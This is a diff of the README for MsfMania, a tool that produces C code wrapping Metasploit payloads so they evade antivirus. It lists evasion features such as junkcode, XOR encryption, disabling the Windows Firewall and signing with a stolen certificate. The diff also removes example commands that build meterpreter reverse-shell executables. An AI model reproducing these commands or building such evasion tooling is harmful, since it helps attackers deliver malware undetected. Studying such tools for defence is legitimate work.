@@ -1,16 +1,25 @@
 # MsfMania
-
 MsfMania is a command line tool developed in Python, allowing to automatically produce a source code in C language that will be used to bypass antimalware before executing a metasploit payload.
 
-## Version 2.2
+## Note that
+I don't put an example of use so that the skids don't know how to use the tool. They will have to do without a basic tutorial ;p.
+I leave only 4 sandbox escape functions because too many sandboxes kill the sandbox. I tried to put 18 then 12 then 4 and the result is better. It is necessary to look for new techniques and for a public tool I would prefer to keep things still unknown.
+I thank @oddc0de for its junkcode functions < 3.
+I thank @paranoidninja for its CarbonCopy tool.
+
+Translated with www.DeepL.com/Translator (free version)
+
+## Version 2.3
 New features:
 ```
 1- Code fully reviewed and redrafted
 2- Perfomance increase
-3- Simple encryption by XOR operation based on key size
-4- You can force the user to run the program as an administrator with the argument "--admin".
-5- The addition of a function allowing sandbox/antivirus evasion is now optional, with the argument "--evasion".
-6- Massive bug fix
+3- A junkcode injection system has been added, it also allows to create functions containing junkcode (junkfunc).
+4- Physical resources used with junkcodes can be duplicated with the intensity mode.
+5- You can specify your own MsfVenom parameters.
+6- You can now disable the Windows Firewall and updates.
+7- You can steal a certificate and sign your executable with it.
+8- Massive bug fix
 ```
 
 ## Requirements
@@ -27,22 +36,15 @@ New features:
 ```
 python3 MsfMania.py -h
 ```
-```
-python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Malware local --evasion --admin
-```
-```
-python3 MsfMania.py staged x64 windows/x64/meterpreter/reverse_tcp 192.168.254.129 4444 Virus remote --procname Wireshark.exe --mscript --icon mco.ico
-```
-```
-python3 MsfMania.py stageless x64 windows/x64/meterpreter_reverse_tcp 192.168.254.129 4444 Word remote --decoy 2000 --mscript --icon word.ico
-```
 
 ## Features
-- Polymorphic C source code.
+- Polymorphic C/C++ source code.
 - x86/x64 staged/stageless windows payload meterpreter/shell.
-- Local/Remote Thread Shellcode Injection
-- Sandbox/Antivirus Evasion
-- Run as Administrator
+- Local/Remote Thread Shellcode Injection.
+- XOR encryption based key lenght.
+- Sandbox/Antivirus Evasion.
+- Junkcode/Junkfunc/Junkintensity.
+- Run as Administrator.
 - Executable customizable with an icon.
 - Cross-compiler MinGW.
 - Strip executable.
